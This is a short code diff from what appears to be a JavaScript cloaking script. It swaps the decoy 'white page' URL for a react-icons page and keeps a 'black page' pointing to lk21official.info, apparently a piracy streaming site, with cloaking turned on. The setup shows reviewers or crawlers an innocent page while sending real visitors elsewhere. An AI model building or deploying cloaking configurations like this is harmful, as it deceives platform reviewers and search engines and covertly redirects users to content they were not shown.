@@ -1,6 +1,6 @@
 // Cloaking
 
-const white_page = "https://kontenku.net"; //white page
+const white_page = "https://react-icons.github.io/react-icons/icons?name=fa"; //white page
 const black_page = "https://lk21official.info/"; //black page
 const cloaking_on = true; //Turn to false to turn off cloaking
 
